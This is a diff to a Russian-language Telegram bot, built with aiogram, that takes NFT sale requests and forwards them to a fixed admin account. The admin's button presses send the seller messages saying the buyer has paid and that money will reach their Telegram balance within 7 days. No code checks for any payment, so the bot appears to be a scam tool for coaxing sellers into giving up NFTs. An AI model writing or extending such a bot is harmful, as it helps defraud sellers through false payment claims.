@@ -9,9 +9,8 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
 
 # ================== НАСТРОЙКИ ==================
-BOT_TOKEN = os.getenv("BOT_TOKEN")          # Токен берётся из переменных окружения
+BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = 8921066517
-BUYER_USERNAME = "@skaence"
 # ===============================================
 
 logging.basicConfig(level=logging.INFO)
@@ -22,9 +21,10 @@ dp = Dispatcher(storage=storage)
 
 
 class SellNFT(StatesGroup):
-    username = State()
+    seller_username = State()
+    buyer_username = State()
+    nft_name = State()
     price = State()
-    description = State()
     confirm = State()
 
 
@@ -32,38 +32,56 @@ class SellNFT(StatesGroup):
 async def start(message: Message, state: FSMContext):
     await state.clear()
     await message.answer(
-        "Привет! Ты хочешь продать NFT.\n\n"
-        "Отправь свой <b>юзернейм</b> (куда потом переводить деньги),\n"
-        "например: @username",
+        "<b>Заявка на продажу NFT</b>\n\n"
+        "Отправь <b>свой юзернейм</b> (куда переводить деньги):\n"
+        "Например: @username",
         parse_mode="HTML"
     )
-    await state.set_state(SellNFT.username)
+    await state.set_state(SellNFT.seller_username)
 
 
-@dp.message(SellNFT.username)
-async def process_username(message: Message, state: FSMContext):
-    await state.update_data(username=message.text.strip())
-    await message.answer("Теперь укажи <b>цену</b> (например: 150 TON или 5000 руб):", parse_mode="HTML")
+@dp.message(SellNFT.seller_username)
+async def process_seller_username(message: Message, state: FSMContext):
+    await state.update_data(seller_username=message.text.strip())
+    await message.answer(
+        "Теперь напиши <b>юзернейм покупателя</b>:\n"
+        "Например: @skaence",
+        parse_mode="HTML"
+    )
+    await state.set_state(SellNFT.buyer_username)
+
+
+@dp.message(SellNFT.buyer_username)
+async def process_buyer_username(message: Message, state: FSMContext):
+    await state.update_data(buyer_username=message.text.strip())
+    await message.answer(
+        "Теперь напиши <b>название NFT</b>:",
+        parse_mode="HTML"
+    )
+    await state.set_state(SellNFT.nft_name)
+
+
+@dp.message(SellNFT.nft_name)
+async def process_nft_name(message: Message, state: FSMContext):
+    await state.update_data(nft_name=message.text.strip())
+    await message.answer(
+        "Теперь укажи <b>цену</b> (например: 150 TON):",
+        parse_mode="HTML"
+    )
     await state.set_state(SellNFT.price)
 
 
 @dp.message(SellNFT.price)
 async def process_price(message: Message, state: FSMContext):
     await state.update_data(price=message.text.strip())
-    await message.answer("Теперь напиши <b>описание NFT</b>:", parse_mode="HTML")
-    await state.set_state(SellNFT.description)
-
-
-@dp.message(SellNFT.description)
-async def process_description(message: Message, state: FSMContext):
-    await state.update_data(description=message.text.strip())
     data = await state.get_data()
 
     text = (
         f"<b>Проверь заявку:</b>\n\n"
-        f"Юзернейм: <code>{data['username']}</code>\n"
-        f"Цена: <b>{data['price']}</b>\n"
-        f"Описание: {data['description']}\n\n"
+        f"Твой юзернейм: <code>{data['seller_username']}</code>\n"
+        f"Юзернейм покупателя: <code>{data['buyer_username']}</code>\n"
+        f"Название NFT: <b>{data['nft_name']}</b>\n"
+        f"Цена: <b>{data['price']}</b>\n\n"
         f"Всё верно?"
     )
 
@@ -86,9 +104,10 @@ async def confirm_yes(callback: CallbackQuery, state: FSMContext):
         f"<b>Новая заявка на продажу NFT</b>\n\n"
         f"От: {seller.full_name} (@{seller.username or 'нет'})\n"
         f"ID продавца: <code>{seller.id}</code>\n\n"
-        f"Юзернейм для оплаты: <code>{data['username']}</code>\n"
-        f"Цена: <b>{data['price']}</b>\n"
-        f"Описание: {data['description']}"
+        f"Юзернейм продавца: <code>{data['seller_username']}</code>\n"
+        f"Юзернейм покупателя: <code>{data['buyer_username']}</code>\n"
+        f"Название NFT: <b>{data['nft_name']}</b>\n"
+        f"Цена: <b>{data['price']}</b>"
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
@@ -99,7 +118,7 @@ async def confirm_yes(callback: CallbackQuery, state: FSMContext):
     ])
 
     await bot.send_message(ADMIN_ID, admin_text, reply_markup=kb, parse_mode="HTML")
-    await callback.message.edit_text("✅ Заявка отправлена покупателю. Ожидай решения.")
+    await callback.message.edit_text("✅ Заявка отправлена. Ожидай решения.")
     await state.clear()
     await callback.answer()
 
@@ -115,17 +134,41 @@ async def confirm_no(callback: CallbackQuery, state: FSMContext):
 async def accept_deal(callback: CallbackQuery):
     seller_id = int(callback.data.split(":")[1])
 
+    # Сообщение продавцу
     await bot.send_message(
-seller_id,
-        f"Покупатель ({BUYER_USERNAME}) оплатил заказ.\n\n"
-        f"После отправки NFT вы получите деньги."
+        seller_id,
+        "Покупатель оплатил заказ.\n\n"
+        "После отправки NFT вы получите деньги."
+    )
+
+    # Кнопка "Подтвердить оплату" для админа
+    new_kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="✅ Подтвердить оплату", callback_data=f"confirm_pay:{seller_id}")]
+    ])
+
+    await callback.message.edit_text(
+        callback.message.text + "\n\n✅ <b>Ты согласился</b>\n\nНажми кнопку ниже, когда будешь готов подтвердить оплату:",
+        reply_markup=new_kb,
+        parse_mode="HTML"
+    )
+    await callback.answer("Продавцу отправлено уведомление")
+
+
+@dp.callback_query(F.data.startswith("confirm_pay:"))
+async def confirm_payment(callback: CallbackQuery):
+    seller_id = int(callback.data.split(":")[1])
+
+    # Финальное сообщение продавцу
+    await bot.send_message(
+        seller_id,
+        "Деньги будут пополнены на баланс Telegram в течение 7 дней."
     )
 
     await callback.message.edit_text(
-        callback.message.text + "\n\n✅ <b>Ты согласился</b>",
+        callback.message.text + "\n\n💰 <b>Оплата подтверждена</b>",
         parse_mode="HTML"
     )
-    await callback.answer("Продавцу отправлено уведомление об оплате")
+    await callback.answer("Продавцу отправлено финальное уведомление")
 
 
 @dp.callback_query(F.data.startswith("reject:"))
